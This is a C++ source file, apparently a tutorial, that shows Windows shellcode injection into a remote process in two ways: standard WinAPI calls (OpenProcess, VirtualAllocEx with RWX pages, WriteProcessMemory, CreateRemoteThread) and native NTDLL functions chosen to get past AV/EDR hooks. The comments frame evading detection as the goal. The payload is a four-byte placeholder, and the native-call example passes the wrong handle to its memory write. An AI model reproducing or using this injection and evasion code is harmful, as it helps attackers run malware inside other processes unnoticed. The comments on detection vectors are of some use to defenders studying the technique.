#include <iostream>
#include <Windows.h>
#include "structs.h"

/*
WHAT IS PROCESS INJECTION 

Process injection is a trivial technique to avoid common AV / EDR detection vectors
not so much EDRs but AVs can and will be fooled by correctly implemented code injection 

HOW IS IT ACHIEVED 

To achieve code injection a very common technique is via using the CreateRemoteThreadFunction
RtlCreateThread or NtCreateThread - any of those three functions will spawn a new thread
for code to be executed inside of 

Typically a basic injection attack will harness WINAPI calls such as the above functions 
already used to create the thread (rather than manually creating threads), as well 
createthread will usually be used in combination with the LoadLibrary function to load 
another module containing the exploit / malware

^ The above description is what we will be focusing on today, in varying forms of complexity

THE WHY 

Thread creation is very simple and sometimes the simplest approach really is the best 
Thread creation is also a very normal task in the process realm, so it cannot be immeditately flagged 
as malicious - our way in. Why recreate the wheel? 

If thread creation isn't up to your use case there are always more advanced methods
to use.

DETECTION VECTORS 

As said earlier, this is a trivial method to injection code into a remote process
even with more advanced obfuscation techniques this whole process at a basic level is very noisy
any decent AV / EDR will respond to these things which is what create thread will be doing

- win api calls
- yara rules for common functions a typical program will not use (Openprocess, WPM, Virtualalloc etc)
- thread creation 
- page permissions e.g. if most pages in a process memoryspace are rx and one page is executing and writing 
  (rwx) then this is the page you will want to further investigate. In this case this would be 
  the space in memory you allocated for your payload

  For more information regarding the topics covered here and anythign relating to windows
  check out geoff chappels site he's a windows ninja, we will be using native functions so 
  the below resource will be very useful to further your understanding

https://www.geoffchappell.com/studies/windows/win32/ntdll/index.htm?tx=8

*/

char payload[] = {0x0, 0x1, 0x2, 0x3};

int main()
{
	// FIRST EXAMPLE 
	// BASIC  THREAD INJECTION TECHNIQUE 

	/*
	
	The below example uses win api calls to achieve code injection 
	This is very simple to achieve but also very easy to detect

	*/

	// for code simplicity input the target process id here 
	DWORD target_proc_id = 21836;
	// using the openprocess function to get an active handle to the desired process
	// very LOUD and easily seen by any antivirus, especially with the specificed access rights
	HANDLE target_proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_proc_id);

	// creating space in target process for our code to be placed 
	// correct memory permissions to allow code to execute 
	char* code_buffer_in_target_process = (char*)VirtualAllocEx(target_proc, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// writing the payload into the target process to later be executed by our thread
	WriteProcessMemory(target_proc, code_buffer_in_target_process, payload, sizeof(payload), NULL);

	// creating thread in remote process to now execute the previously inserted payload
	HANDLE thread = CreateRemoteThread(target_proc, NULL, 0, (LPTHREAD_START_ROUTINE)code_buffer_in_target_process, NULL, 0, NULL);

	printf("Shellcode injected using winapi: 0x%p\n", code_buffer_in_target_process);

	/*----------------------------------------------------------------------------------------------------------------------------------------------*/

	// SECOND EXAMPLE 
	// USING NATIVE CALLS FOR THREAD INJECTION

	/*
	
	A step up from win api calls. Instead of using the provided windows wrappers
	we will call the functiomns required directly, somewhat bypassing potential system hooks 
	and other potential vectors.

	In general this would be my recommended approach due to the massively decreased nature of detection
	just due to not using win api calls. 

	The only issue using native windows functions is that a lot of them are undocumented.
	This can be a problem too as these functions will alter on different versions of windows
	so the function location / params can and will change, meaning without checks these functions 
	will not always work.

	The functions we want to access are known as NT functions, as they are located in NTDLL.dll
	the usermode connectivity to the windows kernel essentially.

	*/
	
	// getting the handle to the ntdll module where the relevant nt functions are stored 
	// nt functions are just native windows functions, just mot wrapped up in the usual winapi format
	// all winapi calls will access these functions but by accessing nt functions directly
	// you can bypass potential hooks placed on the wrapper win32 functions 
	HMODULE ntdll_handle = GetModuleHandle(L"ntdll.dll");

	// defining function prototype for ntopenprocess function - the native function of openprocess
	// check structs.h for more information

	// by using getprocaddress function we are getting the location of the ntopenprocess function from ntdll.dll
	// getprocaddress resolves a function location from the specified module
	// from now on we will use our_open_process instead of using the OpenProcess func as our version skips the winapi call
	pointer_to_openprocess_func our_open_process = (pointer_to_openprocess_func)GetProcAddress(ntdll_handle, "NtOpenProcess");

	// our definitions for the native open process function
	// we have to do some extra work as these are not pvoided for us now that we are not using the winapi wrapper
	HANDLE handle_to_process;

	// the native functions takes pointers to two structures it using for obtaining information about the process
	// this information would otherwise be passed under the hood via the winapi wrapper
	// the object_attributes struct needs to be initialised before the handle to the process is opened 
	OBJECT_ATTRIBUTES object_attributes;
	// initialising our object using the provoided macro
	InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);

	// the client_id struct  stores the unique identifiers of the thread / process we are trying to open a handle to	
	CLIENT_ID client_id = { (PVOID)target_proc_id, 0 };

	// now with the required paramaters initialised we can attempt to open a handle to our process
	our_open_process(&handle_to_process, PROCESS_ALL_ACCESS, &object_attributes, &client_id);

	//repeating the above steps with any other functions we wish
	// in this case we are getting ntallocvirtualmem which is the brains of virtualalloc
	pointer_to_allocate_virtual_mem our_allocate_memory = (pointer_to_allocate_virtual_mem)GetProcAddress(ntdll_handle, "NtAllocateVirtualMemory");

	PVOID process_buffer;
	SIZE_T buffer_len = sizeof(process_buffer);
	our_allocate_memory(handle_to_process, &process_buffer, 0, &buffer_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


	// just like before we are doing these things to achieve code injection 
	/* 
	- getting handle to process
	- allocating memory in remote proc to write our shellcode 
	- writing shellcode 
	- executing thread in previously allocated memory of remote process - where our shellcode is now inserted - directing the flow of execution to our shellcode
	- ...
	*/

	pointer_to_nt_wpm nt_write_process_memory = (pointer_to_nt_wpm)GetProcAddress(ntdll_handle, "NtWriteVirtualMemory");
	nt_write_process_memory(target_proc, process_buffer, payload, sizeof(payload), 0);
	

	// now creating the thread in which our payload will be executed 
	HANDLE thread_handle;
	pointer_to_nt_create_thread nt_create_threadex = (pointer_to_nt_create_thread)GetProcAddress(ntdll_handle, "NtCreateThreadEx");
	nt_create_threadex(&thread_handle, PROCESS_ALL_ACCESS, NULL, handle_to_process, (LPTHREAD_START_ROUTINE)process_buffer, NULL, false, NULL, NULL, NULL, NULL);

	printf("Shellcode injected using native functions: 0x%p", process_buffer);

	DWORD buf;
	std::cin >> buf;
	return 0;
}